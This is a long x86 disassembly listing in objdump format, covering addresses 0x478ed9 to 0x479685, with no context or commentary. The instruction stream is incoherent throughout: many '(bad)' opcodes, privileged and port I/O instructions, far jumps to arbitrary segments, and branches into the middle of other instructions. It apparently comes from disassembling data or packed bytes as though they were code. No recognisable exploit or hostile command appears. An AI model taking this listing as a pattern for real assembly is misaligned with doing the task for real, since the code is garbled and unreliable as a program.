  478ed9:	xchg   ecx,eax
  478eda:	jle    0x478ee6
  478edc:	pop    ebx
  478edd:	mov    ecx,0x930e1dbf
  478ee2:	sub    DWORD PTR [edx+0x78503487],esp
  478ee8:	fisub  WORD PTR [edx-0xd]
  478eeb:	in     al,0x24
  478eed:	icebp  
  478eee:	push   ds
  478eef:	mov    dl,0x6
  478ef1:	sbb    al,0xf1
  478ef3:	icebp  
  478ef4:	lds    eax,FWORD PTR [esi]
  478ef6:	nop
  478ef7:	xchg   edi,eax
  478ef8:	test   DWORD PTR [edx+0x2a],esp
  478efb:	fsubr  st(7),st
  478efd:	dec    ebx
  478efe:	push   edx
  478eff:	sub    BYTE PTR [edi+ebp*8],0xeb
  478f03:	jge    0x478ea8
  478f05:	adc    BYTE PTR [edx-0x57],0xc2
  478f09:	and    al,0x5c
  478f0b:	add    DWORD PTR [ecx+0x1fff82a3],esp
  478f11:	icebp  
  478f12:	std    
  478f13:	mov    esp,0xd25d3ce6
  478f18:	pushf  
  478f19:	jnp    0x478f4b
  478f1b:	inc    edi
  478f1c:	ret    0x1d27
  478f1f:	scas   al,BYTE PTR es:[edi]
  478f20:	mov    esi,0x968a7eee
  478f25:	pop    ebx
  478f26:	mov    ecx,0x7e7e774d
  478f2b:	inc    esp
  478f2c:	adc    eax,0x761a05fa
  478f31:	data16 jnp 0x478ee3
  478f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  478f35:	or     BYTE PTR [edx+0x1f],bl
  478f38:	and    BYTE PTR [edx-0x79f458fb],bh
  478f3e:	imul   eax,DWORD PTR [eax-0x4e85ed72],0xb792f78c
  478f48:	xchg   ebx,eax
  478f49:	mov    edi,0xbbd5b830
  478f4e:	fs fwait
  478f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  478f51:	and    ah,cl
  478f53:	or     BYTE PTR [eax],dl
  478f55:	xchg   ebp,eax
  478f56:	fbld   TBYTE PTR [eax+0x6c]
  478f59:	xchg   esi,eax
  478f5a:	bound  edi,QWORD PTR [esi-0x41]
  478f5d:	inc    edx
  478f5e:	jmp    0x478fb4
  478f60:	in     al,0xd3
  478f62:	int    0x88
  478f64:	sbb    dl,ah
  478f66:	ins    BYTE PTR es:[edi],dx
  478f67:	cmp    bl,BYTE PTR ds:0x74931d54
  478f6d:	mov    edi,0xf47793f1
  478f72:	adc    cl,BYTE PTR [eax-0xca8260f]
  478f78:	fst    QWORD PTR [edx+0x10bf127c]
  478f7e:	aaa    
  478f7f:	hlt    
  478f80:	mov    al,0xdf
  478f82:	mov    BYTE PTR [ecx],al
  478f84:	jns    0x478f3c
  478f86:	xor    BYTE PTR [edi],dh
  478f88:	pop    ecx
  478f89:	mov    es,WORD PTR [ebx-0x7ffceece]
  478f8f:	dec    esp
  478f90:	xchg   esp,eax
  478f91:	add    al,0x7c
  478f93:	fstp   DWORD PTR [ebx+0x64]
  478f96:	ficomp WORD PTR [ebx+0x63]
  478f99:	pusha  
  478f9a:	xchg   ebx,eax
  478f9b:	xor    DWORD PTR [ebx+0x83ba2d9],ebp
  478fa1:	cs xchg ebx,eax
  478fa3:	bound  ecx,QWORD PTR [edx]
  478fa5:	fdivp  st(2),st
  478fa7:	fisub  DWORD PTR [esi]
  478fa9:	mov    edx,0x1de53544
  478fae:	sub    al,0x22
  478fb0:	mov    dh,0x37
  478fb2:	jecxz  0x479023
  478fb4:	push   es
  478fb5:	imul   esi,DWORD PTR [edx+0xf1d4549],0x66
  478fbc:	sti    
  478fbd:	add    eax,0x9f25a5ba
  478fc2:	jnp    0x478faa
  478fc4:	sbb    cl,BYTE PTR [esi+0x52]
  478fc7:	mov    ecx,DWORD PTR [edx-0x2224c9e2]
  478fcd:	test   DWORD PTR [esi],eax
  478fcf:	adc    cl,BYTE PTR [esi-0x3a3970b]
  478fd5:	jge    0x478f65
  478fd7:	push   0x93b218c
  478fdc:	xchg   ebx,eax
  478fdd:	adc    eax,0x9cb3493
  478fe2:	sbb    al,0xe4
  478fe4:	push   es
  478fe5:	pusha  
  478fe6:	bswap  ebx
  478fe8:	jbe    0x479010
  478fea:	inc    edx
  478feb:	xchg   edi,eax
  478fec:	pushf  
  478fed:	fs in  al,dx
  478fef:	push   cs
  478ff0:	adc    dh,BYTE PTR [edi]
  478ff2:	sbb    BYTE PTR [edi-0x37ca7fee],0x85
  478ff9:	xor    al,0x59
  478ffb:	out    dx,eax
  478ffc:	mov    DWORD PTR [ebp+eax*8-0x3e1ce892],edi
  479003:	pushf  
  479004:	and    DWORD PTR [ebx+0x21],esi
  479007:	and    esp,esi
  479009:	push   ebx
  47900a:	cmc    
  47900b:	dec    ebp
  47900c:	aad    0x61
  47900e:	inc    eax
  47900f:	jmp    0x6e6f:0x6f6854a6
  479016:	jg     0x478fa8
  479018:	dec    ecx
  479019:	fs push edx
  47901b:	push   cs
  47901c:	push   ds
  47901d:	add    al,BYTE PTR [edi+0x9691e46]
  479023:	loope  0x478fd2
  479025:	jae    0x47903c
  479027:	jl     0x478fac
  479029:	(bad)  
  47902a:	mov    cl,0x8a
  47902c:	mov    gs,WORD PTR [esp+ecx*4-0x5e2df837]
  479033:	inc    edi
  479034:	imul   esi,DWORD PTR [eax],0xffffffa0
  479037:	add    eax,0x310db03a
  47903c:	mov    al,ds:0x12ff6638
  479041:	rcr    bl,0xf3
  479044:	mov    eax,0xc0e1146
  479049:	xchg   ecx,eax
  47904a:	popa   
  47904b:	pop    ebp
  47904c:	jae    0x478fe0
  47904e:	in     eax,dx
  47904f:	add    eax,0xe5a1dfe
  479054:	outs   dx,BYTE PTR ds:[esi]
  479055:	lods   al,BYTE PTR ds:[esi]
  479056:	in     al,dx
  479057:	sub    al,0x45
  479059:	pop    cx
  47905b:	(bad)  
  47905c:	std    
  47905d:	test   BYTE PTR [esi+0xd],dh
  479060:	mov    edx,0xeeb5beed
  479065:	adc    bh,BYTE PTR [esi]
  479067:	or     eax,0x8e8af979
  47906c:	pop    ecx
  47906d:	mov    eax,ds:0x1325a618
  479072:	sbb    bl,bl
  479074:	xchg   edi,eax
  479075:	mov    bh,0xa6
  479077:	adc    al,BYTE PTR [edi+ebx*4-0x57]
  47907b:	test   DWORD PTR [ecx],ecx
  47907d:	mov    WORD PTR [edx+0x36],es
  479080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  479081:	nop
  479082:	je     0x479061
  479084:	test   DWORD PTR [esi+0x204c9074],edx
  47908a:	pop    ebx
  47908b:	inc    esi
  47908c:	mov    ?,eax
  47908e:	fs pop ebx
  479090:	dec    eax
  479091:	xor    ecx,DWORD PTR [esi+0x165f41fa]
  479097:	adc    BYTE PTR [ebx-0x72],cl
  47909a:	adc    eax,0xe7364976
  47909f:	pop    eax
  4790a0:	xor    eax,0x9efe1d0c
  4790a5:	or     DWORD PTR [ecx-0x46],edi
  4790a8:	icebp  
  4790a9:	adc    bh,BYTE PTR [edx]
  4790ab:	and    bh,bh
  4790ad:	push   edi
  4790ae:	cdq    
  4790af:	nop
  4790b0:	addr16 inc edx
  4790b2:	lahf   
  4790b3:	cmp    BYTE PTR [edi-0x1bd9836e],0xb1
  4790ba:	pop    edi
  4790bb:	in     al,dx
  4790bc:	test   dl,al
  4790be:	fwait
  4790bf:	add    al,0x33
  4790c1:	sub    BYTE PTR [edx+ecx*1],dl
  4790c4:	nop
  4790c5:	adc    ah,cl
  4790c7:	jbe    0x479071
  4790c9:	jne    0x47905a
  4790cb:	xchg   esp,eax
  4790cc:	inc    esi
  4790cd:	test   bh,ch
  4790cf:	and    al,0x8f
  4790d1:	clc    
  4790d2:	test   cl,ch
  4790d4:	inc    eax
  4790d5:	adc    DWORD PTR [edx],edx
  4790d7:	inc    esi
  4790d8:	(bad)  [ecx+eiz*1]
  4790db:	das    
  4790dc:	cli    
  4790dd:	test   BYTE PTR [ebx+edx*2+0x5a],ah
  4790e1:	test   esp,ebx
  4790e3:	cmp    ebp,DWORD PTR es:[edx-0x22]
  4790e7:	fs push ecx
  4790e9:	pop    ss
  4790ea:	adc    cl,al
  4790ec:	push   eax
  4790ed:	jb     0x479134
  4790ef:	inc    edi
  4790f0:	sub    eax,0xb3358bd9
  4790f5:	sub    ah,BYTE PTR [ebx+0x2a]
  4790f8:	int3   
  4790f9:	pop    esi
  4790fa:	and    al,0x7
  4790fc:	xchg   edx,eax
  4790fd:	sahf   
  4790fe:	retf   
  4790ff:	xchg   esp,eax
  479100:	int    0x94
  479102:	xchg   BYTE PTR [edi+esi*4-0x50],ah
  479106:	sbb    eax,0x8179543
  47910b:	sbb    eax,eax
  47910d:	pop    edx
  47910e:	dec    ebx
  47910f:	pop    ss
  479110:	pop    ds
  479111:	or     ch,ch
  479113:	jns    0x4790ab
  479115:	add    DWORD PTR [edx],edx
  479117:	push   ebp
  479118:	sbb    BYTE PTR [ecx+0x69],dl
  47911b:	loop   0x479162
  47911d:	xchg   esi,eax
  47911e:	jp     0x479127
  479120:	dec    esi
  479121:	adc    cl,BYTE PTR [ecx+ecx*8]
  479124:	test   BYTE PTR [ecx+0x4216d82f],bl
  47912a:	xor    BYTE PTR [esi],bl
  47912c:	adc    eax,0xfee36dcb
  479131:	add    eax,0xeedd3516
  479136:	fwait
  479137:	mov    cl,0xf1
  479139:	sbb    BYTE PTR [ecx],cl
  47913b:	shr    BYTE PTR [ecx-0x3e],cl
  47913e:	ss or  eax,0x21047e08
  479144:	stc    
  479145:	xchg   esi,eax
  479146:	dec    esp
  479147:	fmul   DWORD PTR [edi-0x1a]
  47914a:	cmp    al,0x2
  47914c:	daa    
  47914d:	mov    bl,0x2d
  47914f:	leave  
  479150:	add    esp,esp
  479152:	repz xchg esi,eax
  479154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  479155:	push   ebp
  479156:	dec    edi
  479157:	and    ecx,DWORD PTR [ebx]
  479159:	xchg   ebp,eax
  47915a:	push   esp
  47915b:	das    
  47915c:	sub    BYTE PTR [eax-0x4d],0xf6
  479160:	sbb    al,0xd8
  479162:	pop    ss
  479163:	clc    
  479164:	jmp    0x47914d
  479166:	data16 aam 0x2
  479169:	rol    BYTE PTR [ebp+ecx*1-0x77],1
  47916d:	ret    0x9f34
  479170:	outs   dx,BYTE PTR ds:[esi]
  479171:	and    al,ah
  479173:	xchg   ecx,eax
  479174:	dec    ecx
  479175:	inc    eax
  479176:	inc    ebx
  479177:	clc    
  479178:	push   es
  479179:	mov    al,ah
  47917b:	jmp    FWORD PTR [ebx-0x76]
  47917e:	sahf   
  47917f:	(bad)  
  479180:	cmp    dl,ah
  479182:	loope  0x4791dd
  479184:	mov    ds:0x3c5b17a5,al
  479189:	std    
  47918a:	pop    ds
  47918b:	rcl    BYTE PTR [eax-0x26],cl
  47918e:	or     eax,0x878ae82b
  479193:	imul   ebx,DWORD PTR [ecx+ecx*2+0x58],0xc0bff013
  47919b:	or     eax,0xc259b279
  4791a0:	ins    DWORD PTR es:[edi],dx
  4791a1:	fwait
  4791a2:	sar    ch,0x91
  4791a5:	pop    ecx
  4791a6:	js     0x47913f
  4791a8:	dec    esp
  4791a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4791aa:	xchg   ebx,eax
  4791ab:	pop    ds
  4791ac:	sub    DWORD PTR [ebx+eiz*2],edx
  4791af:	xchg   edi,eax
  4791b0:	dec    esp
  4791b1:	fsub   DWORD PTR [ebx]
  4791b3:	out    0x49,eax
  4791b5:	inc    esp
  4791b6:	mov    ebp,0xed5b1143
  4791bb:	cmc    
  4791bc:	add    dh,BYTE PTR [eax+0x3]
  4791bf:	sahf   
  4791c0:	pop    esi
  4791c1:	test   esi,0x464518cc
  4791c7:	imul   ebx,DWORD PTR [ecx+eax*2],0x56
  4791cb:	xchg   ecx,eax
  4791cc:	loopne 0x47916e
  4791ce:	pop    ds
  4791cf:	xor    ch,BYTE PTR cs:[ecx-0x32]
  4791d3:	or     eax,0x97cb2401
  4791d8:	in     al,0xb6
  4791da:	mov    ah,0x22
  4791dc:	pop    esp
  4791dd:	pushf  
  4791de:	test   BYTE PTR [ebp+0x6b98725e],dh
  4791e4:	inc    edi
  4791e5:	stos   BYTE PTR es:[edi],al
  4791e6:	sbb    ebp,DWORD PTR [edi]
  4791e8:	cmp    DWORD PTR [ecx+ecx*8+0x5a],ebp
  4791ec:	adc    cl,cl
  4791ee:	mov    ch,0x25
  4791f0:	and    ebx,DWORD PTR ds:0xe29616e5
  4791f6:	sub    al,0xab
  4791f8:	xchg   DWORD PTR [ecx+eiz*8+0x3d5430bd],ebx
  4791ff:	loopne 0x479209
  479201:	adc    eax,0x4005e12
  479206:	jge    0x479228
  479208:	nop
  479209:	xchg   esi,eax
  47920a:	dec    esp
  47920b:	fcomp  DWORD PTR [esi-0x80]
  47920e:	or     cl,BYTE PTR [ecx]
  479210:	sbb    al,0xc9
  479212:	out    0x87,al
  479214:	div    DWORD PTR [edi+eax*4+0x13034ffd]
  47921b:	enter  0x8785,0xc5
  47921f:	lock loope 0x4791ec
  479222:	(bad)  
  479223:	loop   0x479249
  479225:	dec    esi
  479226:	mov    ?,WORD PTR ds:0xb9362c47
  47922c:	nop
  47922d:	out    0x85,al
  47922f:	mov    ch,0xd8
  479231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479232:	fisttp WORD PTR [edx]
  479234:	jmp    0x520c7c4d
  479239:	scas   al,BYTE PTR es:[edi]
  47923a:	in     al,0x79
  47923c:	test   BYTE PTR [eax+edx*4-0x3baa673c],dl
  479243:	daa    
  479244:	sub    eax,0x465722ec
  479249:	stc    
  47924a:	mov    bl,0x11
  47924c:	dec    ebx
  47924d:	push   cs
  47924e:	jae    0x479250
  479250:	inc    eax
  479251:	popa   
  479252:	push   eax
  479253:	les    esp,FWORD PTR [ecx]
  479255:	push   ss
  479256:	pop    ecx
  479257:	push   0xffffffbd
  479259:	xchg   edx,eax
  47925a:	cmp    al,0x8b
  47925c:	aaa    
  47925d:	psllw  mm6,mm1
  479260:	hlt    
  479261:	mov    dl,0xd0
  479263:	nop
  479264:	out    dx,al
  479265:	adc    al,0x1f
  479267:	cwde   
  479268:	mov    al,0x58
  47926a:	dec    ebx
  47926b:	inc    eax
  47926c:	fsub   QWORD PTR [edx-0x44]
  47926f:	pop    esi
  479270:	push   ecx
  479271:	dec    esi
  479272:	xor    eax,0xddafbbc2
  479277:	imul   esp,ecx,0xb969950c
  47927d:	out    0x19,al
  47927f:	out    dx,al
  479280:	imul   esp,DWORD PTR [esi-0x12],0xe48696a4
  479287:	add    BYTE PTR [edx-0x2b00112c],bl
  47928d:	jbe    0x47923a
  47928f:	push   0xffffffc2
  479291:	stos   BYTE PTR es:[edi],al
  479292:	outs   dx,BYTE PTR ds:[esi]
  479293:	mov    esp,0x89b0f86b
  479298:	mov    BYTE PTR [ebp+0x57],ah
  47929b:	jle    0x4792d6
  47929d:	enter  0x853,0x3f
  4792a1:	jb     0x4792a1
  4792a3:	hlt    
  4792a4:	xor    eax,0x12b1605b
  4792a9:	ins    BYTE PTR es:[edi],dx
  4792aa:	mov    bh,0xb0
  4792ac:	add    ebx,DWORD PTR [ecx-0x4e8f2b6e]
  4792b2:	jp     0x47932d
  4792b4:	fcomp  DWORD PTR [ebx+0x76426bbd]
  4792ba:	add    BYTE PTR [edx-0x15],al
  4792bd:	in     al,0xdd
  4792bf:	xchg   BYTE PTR [ebx-0x3ae9a4da],ah
  4792c5:	icebp  
  4792c6:	add    al,0x69
  4792c8:	fnstsw WORD PTR [ebx+eiz*2]
  4792cb:	fwait
  4792cc:	loope  0x4792a2
  4792ce:	shl    DWORD PTR [esi],1
  4792d0:	pop    eax
  4792d1:	sbb    BYTE PTR [esi+0x36],ch
  4792d4:	es ret 
  4792d6:	inc    edi
  4792d7:	xor    ecx,DWORD PTR [edx]
  4792d9:	hlt    
  4792da:	pop    eax
  4792db:	fcmovbe st,st(7)
  4792dd:	mov    DWORD PTR [eax-0x49],edx
  4792e0:	and    eax,0xee17daa3
  4792e5:	mov    dl,0x2
  4792e7:	test   BYTE PTR [eax-0x11e62c1c],dh
  4792ed:	sbb    esp,esp
  4792ef:	loop   0x4792e3
  4792f1:	inc    eax
  4792f2:	pop    eax
  4792f3:	cmp    DWORD PTR ss:[ecx-0x27],0xfffffffe
  4792f8:	in     al,0x64
  4792fa:	add    cl,ch
  4792fc:	adc    ch,BYTE PTR [eax-0x39]
  4792ff:	icebp  
  479300:	or     esp,esp
  479302:	sub    bh,BYTE PTR [ecx]
  479304:	out    0x12,eax
  479306:	add    al,0x8
  479308:	push   esi
  479309:	(bad)  
  47930a:	mov    esi,esp
  47930c:	mov    DWORD PTR [ecx],eax
  47930e:	dec    edx
  47930f:	push   ds
  479310:	jb     0x4792c8
  479312:	shl    cl,1
  479314:	push   0x813923f4
  479319:	pushf  
  47931a:	pop    edx
  47931b:	hlt    
  47931c:	or     dh,ah
  47931e:	xchg   edx,eax
  47931f:	ret    
  479320:	push   es
  479321:	nop
  479322:	rcl    ecx,0x68
  479325:	(bad)  
  479326:	sub    DWORD PTR [ecx-0x6dd851c0],edi
  47932c:	leave  
  47932d:	inc    ebx
  47932e:	push   es
  47932f:	nop
  479330:	mov    bh,0xc1
  479332:	mov    eax,DWORD PTR ds:0x53902724
  479338:	mov    ebp,0x72052f05
  47933d:	enter  0x7200,0xa1
  479341:	mov    cl,0xd9
  479343:	and    DWORD PTR [edi],edx
  479345:	enter  0x4655,0xb5
  479349:	cmp    esp,ecx
  47934b:	popf   
  47934c:	jno    0x47933b
  47934e:	mov    esi,0xd73800a4
  479353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  479354:	mov    DWORD PTR [eax-0xb2c6cd1],ecx
  47935a:	xor    al,0x13
  47935c:	iret   
  47935d:	jl     0x479309
  47935f:	leave  
  479360:	adc    eax,0x12dfa6f4
  479365:	sbb    eax,0x11127973
  47936a:	cmp    BYTE PTR ds:0x57f453f4,dl
  479370:	mov    dl,0xa7
  479372:	fs push ebx
  479374:	hlt    
  479375:	arpl   di,bp
  479377:	xchg   ebx,eax
  479378:	dec    ecx
  479379:	or     bl,BYTE PTR [ebp-0x4e]
  47937c:	mov    DWORD PTR [eax+0x75f49338],ecx
  479382:	dec    esp
  479383:	leave  
  479384:	add    ebp,esp
  479386:	push   ss
  479387:	(bad)  
  479388:	mov    edx,0x61888215
  47938d:	or     ecx,ebx
  47938f:	and    al,0x15
  479391:	dec    ebp
  479392:	sub    ebp,DWORD PTR [ebx]
  479394:	sbb    eax,0x83b67a65
  479399:	fnstenv [eax]
  47939b:	aaa    
  47939c:	fdiv   DWORD PTR [edx+0x59f74b75]
  4793a2:	add    bh,dh
  4793a4:	fdiv   st,st(7)
  4793a6:	pop    esp
  4793a7:	repnz push edi
  4793a9:	adc    eax,0x5e045614
  4793ae:	mov    bh,0x1a
  4793b0:	cs mov ebp,0x9e0212e5
  4793b6:	xlat   BYTE PTR ds:[ebx]
  4793b7:	and    al,0x71
  4793b9:	jae    0x4793c2
  4793bb:	pushf  
  4793bc:	lock fdiv QWORD PTR [edx]
  4793bf:	dec    edi
  4793c0:	leave  
  4793c1:	mov    ecx,0x44f49e26
  4793c6:	push   esp
  4793c7:	or     esi,DWORD PTR [ecx+0x692c10af]
  4793cd:	push   cs
  4793ce:	adc    esp,DWORD PTR [edx]
  4793d0:	add    al,0x2
  4793d2:	(bad)  
  4793d3:	xchg   edx,eax
  4793d4:	fdivrp st(1),st
  4793d6:	sub    al,0xfd
  4793d8:	add    al,0xf2
  4793da:	or     BYTE PTR [ebx+0x235fedae],bh
  4793e0:	push   eax
  4793e1:	add    ah,BYTE PTR [esi]
  4793e3:	in     al,0xb
  4793e5:	and    esp,DWORD PTR [esi]
  4793e7:	jecxz  0x47945c
  4793e9:	and    ebx,ebx
  4793eb:	push   es
  4793ec:	adc    DWORD PTR [edx-0xb],ebp
  4793ef:	sahf   
  4793f0:	pop    esp
  4793f1:	(bad)  
  4793f2:	iret   
  4793f3:	and    ebp,edx
  4793f5:	mov    dl,0x2b
  4793f7:	push   esi
  4793f8:	dec    ebx
  4793f9:	mov    DWORD PTR [ebx+0x1e],ecx
  4793fc:	out    0xbe,al
  4793fe:	sbb    BYTE PTR [edx+0x2390f300],cl
  479404:	and    al,0x4f
  479406:	sub    cl,ah
  479408:	sbb    al,0x33
  47940a:	sub    ebp,DWORD PTR ds:0x287129b
  479410:	ja     0x4793bd
  479412:	jmp    0x4c44:0x4860026f
  479419:	loope  0x4793a8
  47941b:	aaa    
  47941c:	adc    al,BYTE PTR [ecx]
  47941e:	(bad)  
  47941f:	ficom  DWORD PTR ds:0x48c03ff9
  479425:	sahf   
  479426:	cdq    
  479427:	inc    ecx
  479428:	mov    dh,0x37
  47942a:	push   ecx
  47942b:	out    dx,eax
  47942c:	dec    edi
  47942d:	adc    eax,0xc259cb9
  479432:	or     BYTE PTR ds:0x224ad70f,bh
  479438:	pusha  
  479439:	out    dx,eax
  47943a:	cmp    ecx,DWORD PTR [edi]
  47943c:	ss dec edi
  47943e:	and    bl,al
  479440:	out    0x82,al
  479442:	clc    
  479443:	retf   
  479444:	xor    al,0x36
  479446:	test   dh,bh
  479448:	repnz or cl,ch
  47944b:	sub    BYTE PTR [ecx],bh
  47944d:	xor    BYTE PTR [esi+0x33],dl
  479450:	mov    eax,0xc504e42d
  479455:	xor    edx,edx
  479457:	mov    edx,DWORD PTR [edi+0x2b]
  47945a:	rcr    DWORD PTR [esi+eiz*8],0x2d
  47945e:	mov    dh,0x91
  479460:	daa    
  479461:	xor    BYTE PTR [ebx+0x4b13b2c0],ah
  479467:	scas   eax,DWORD PTR es:[edi]
  479468:	(bad)  
  479469:	mov    ecx,0x3f673041
  47946e:	sbb    eax,DWORD PTR [eax+edi*1]
  479471:	sahf   
  479472:	mov    BYTE PTR [eax],dh
  479474:	sub    DWORD PTR [ecx+eiz*1],0x59
  479478:	pop    ecx
  479479:	and    bh,dh
  47947b:	inc    ecx
  47947c:	mov    esp,0x930f6e9a
  479481:	mov    ebp,0x9c07d8cb
  479486:	and    al,0xd4
  479488:	(bad)  
  47948a:	mov    dl,BYTE PTR [eax+0x57215f1a]
  479490:	xor    ch,bl
  479492:	inc    edx
  479493:	icebp  
  479494:	imul   edx,edi,0xffffffbb
  479497:	in     al,dx
  479498:	jne    0x47941f
  47949a:	out    dx,eax
  47949b:	mov    dh,0xcd
  47949d:	push   eax
  47949e:	add    al,0x8a
  4794a0:	rcl    BYTE PTR [ebx+ecx*4],0x88
  4794a4:	leave  
  4794a5:	ror    BYTE PTR [edi-0x61],cl
  4794a8:	inc    eax
  4794a9:	in     eax,dx
  4794aa:	mov    ah,dl
  4794ac:	or     edi,eax
  4794ae:	add    al,0x24
  4794b0:	jbe    0x47943d
  4794b2:	leave  
  4794b3:	mov    ebx,0x28b8d8a2
  4794b8:	mov    ebx,ebx
  4794ba:	cmp    BYTE PTR [edi-0x1383e79],bh
  4794c0:	(bad)  
  4794c1:	(bad)  
  4794c2:	inc    DWORD PTR [eax-0x741474ad]
  4794c8:	fidiv  WORD PTR [ebx]
  4794ca:	iret   
  4794cb:	inc    ebp
  4794cc:	pop    esi
  4794cd:	push   eax
  4794cf:	cmp    al,0xf0
  4794d1:	pop    ecx
  4794d2:	repz rol BYTE PTR [edi],0x1d
  4794d6:	cmp    bh,dl
  4794d8:	repnz cmp esp,ebp
  4794db:	cmp    ecx,edi
  4794dd:	push   0x77
  4794df:	cmp    ecx,esp
  4794e1:	repz sti 
  4794e3:	push   esi
  4794e5:	lea    ebx,[esi-0x3e]
  4794e8:	add    BYTE PTR [edi],0x35
  4794eb:	adc    al,0xd
  4794ed:	cmp    dl,ah
  4794ef:	cmp    ebp,esp
  4794f1:	jmp    0x4794f4
  4794f3:	dec    ecx
  4794f4:	cmp    eax,edx
  4794f6:	cmc    
  4794f7:	inc    ebx
  4794f8:	adc    BYTE PTR [edi-0x5],bh
  4794fb:	mul    BYTE PTR [ebp-0x23]
  4794fe:	xor    al,BYTE PTR [eax-0x74f0d0c9]
  479504:	shrd   esi,ebx,cl
  479507:	add    bh,cl
  479509:	inc    bh
  47950b:	rol    BYTE PTR [edi],0xd8
  47950e:	(bad)  
  47950f:	(bad)  
  479510:	jmp    ebp
  479512:	cmp    al,0xc5
  479514:	push   eax
  479515:	cmp    ecx,esi
  479517:	cmp    esp,ebx
  479519:	dec    eax
  47951a:	pop    ebp
  47951b:	cmp    edx,ecx
  47951d:	cmp    al,0xd6
  47951f:	mov    esi,ebx
  479521:	cmp    dl,bl
  479523:	lea    edi,[edi+0x1]
  479526:	and    ecx,0x1074a10
  47952c:	push   0xffffffff
  47952e:	in     eax,dx
  47952f:	dec    ebx
  479530:	dec    DWORD PTR [ebx+0x3ae33af2]
  479536:	out    dx,al
  479537:	nop
  479538:	pop    ebx
  479539:	xchg   ebx,eax
  47953a:	and    al,0x1
  47953c:	jne    0x3cd349c7
  479542:	ret    
  479543:	xor    ecx,edx
  479545:	cmp    al,0xe7
  479547:	mov    ebx,0x3bdbdbfd
  47954c:	jmp    0xca1d:0xffc83a64
  479553:	pop    ecx
  479554:	repnz sub ecx,ecx
  479557:	je     0xf839576
  47955d:	mov    al,ds:0x3a7ffec8
  479562:	in     al,0x3a
  479564:	fidivr DWORD PTR [ebx]
  479566:	loop   0x4795a2
  479568:	(bad)  
  479569:	mov    dx,0x3712
  47956d:	add    BYTE PTR [eax],al
  47956f:	add    DWORD PTR [ecx],edx
  479571:	pop    ecx
  479572:	or     BYTE PTR [edi-0x1],bl
  479575:	(bad)  
  479576:	dec    DWORD PTR [edi+0xa]
  479579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47957a:	rol    DWORD PTR [ebp-0x7bbcdcdd],1
  479580:	mov    al,0x1b
  479582:	dec    edi
  479583:	out    0x27,al
  479585:	pop    eax
  479586:	fs add al,0x78
  479589:	mov    ecx,0x392081c1
  47958e:	or     BYTE PTR [ebx-0xd5cf24],dl
  479594:	(bad)  
  479595:	(bad)  
  479596:	call   edi
  479598:	add    al,0x42
  47959a:	ins    DWORD PTR es:[edi],dx
  47959b:	and    DWORD PTR [esi-0x4d],esp
  47959e:	in     al,0x8d
  4795a0:	aas    
  4795a1:	das    
  4795a2:	and    eax,DWORD PTR [ecx-0x24f5ed4f]
  4795a8:	or     BYTE PTR ds:0xba6f3c7a,ch
  4795ae:	into   
  4795af:	xlat   BYTE PTR ds:[ebx]
  4795b0:	popa   
  4795b1:	or     DWORD PTR fs:[eax+esi*4-0xe389],ecx
  4795b9:	(bad)  
  4795ba:	dec    ebx
  4795bc:	sub    al,0x41
  4795be:	adc    DWORD PTR gs:[edx-0x4d],esi
  4795c2:	rcl    DWORD PTR [ecx-0x1fd3d0d9],0x8f
  4795c9:	aas    
  4795ca:	or     dh,al
  4795cc:	cmp    eax,0x6931797e
  4795d1:	mov    edi,0x251588c3
  4795d6:	add    DWORD PTR [ecx+edi*4-0xe0fb],eax
  4795dd:	aaa    
  4795de:	inc    edx
  4795e0:	cmp    eax,0x64544845
  4795e5:	mov    bl,0xd6
  4795e7:	pop    esi
  4795e8:	shl    dl,cl
  4795ea:	adc    esp,DWORD PTR [ebx]
  4795ec:	iret   
  4795ed:	dec    ecx
  4795ee:	arpl   WORD PTR [eax+eiz*1+0x5f],bp
  4795f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4795f3:	(bad)  
  4795f4:	xchg   esi,eax
  4795f5:	push   ss
  4795f6:	and    al,0x18
  4795f8:	(bad)  
  4795f9:	fdiv   st(7),st
  4795fb:	(bad)  
  4795fc:	call   DWORD PTR [edi+0x605d0839]
  479602:	push   ss
  479603:	jg     0x4795b5
  479605:	les    eax,FWORD PTR [ecx-0x7ae0f3df]
  47960b:	mov    ecx,0x27ca3877
  479610:	inc    esp
  479611:	xor    DWORD PTR [bp-0x8],edi
  479615:	(bad)  
  479616:	mov    BYTE PTR [edi],bh
  479618:	dec    edx
  479619:	xchg   edi,eax
  47961a:	(bad)  
  47961b:	push   esi
  47961d:	sub    edx,DWORD PTR [esp+ebp*4+0x580a7f24]
  479624:	jnp    0x47964c
  479626:	outs   dx,DWORD PTR ds:[esi]
  479627:	mov    eax,0x383aa0d6
  47962c:	or     BYTE PTR [ebx-0x25c2e758],al
  479632:	inc    eax
  479633:	cmp    bl,bh
  479635:	fdivp  st(7),st
  479637:	(bad)  
  479638:	jle    0x4795ed
  47963a:	ror    BYTE PTR [edx-0x6fddc1ca],1
  479640:	mov    ecx,0xfa30e19
  479645:	pop    ecx
  479646:	jns    0x47964c
  479648:	jg     0x4795ec
  47964a:	lahf   
  47964b:	jg     0x4795e7
  47964d:	add    edi,DWORD PTR [edi]
  47964f:	in     al,dx
  479650:	pop    edi
  479651:	(bad)  
  479652:	repnz (bad) 
  479654:	cmp    DWORD PTR [eax+0x67],ecx
  479657:	adc    ah,BYTE PTR [ebx-0x46]
  47965a:	(bad)  
  47965b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47965c:	push   ebx
  47965d:	add    eax,DWORD PTR [ebx]
  47965f:	xchg   esp,eax
  479660:	and    esi,eax
  479662:	cmp    eax,0xc13a666e
  479667:	nop
  479668:	adc    cl,BYTE PTR [edx+0x6f]
  47966b:	in     eax,dx
  47966c:	in     eax,0xff
  47966e:	and    al,0x8e
  479670:	test   al,0x12
  479672:	cmp    eax,0x4a592ccd
  479677:	cmp    BYTE PTR [ebp-0x54],ah
  47967a:	xor    ah,BYTE PTR [edi+edi*4]
  47967d:	outs   dx,DWORD PTR ds:[esi]
  47967e:	or     edi,edx
  479680:	cmp    ebx,ebx
  479682:	aas    
  479683:	test   ch,bh
  479685:	outs   dx,BYTE PTR ds:[esi]
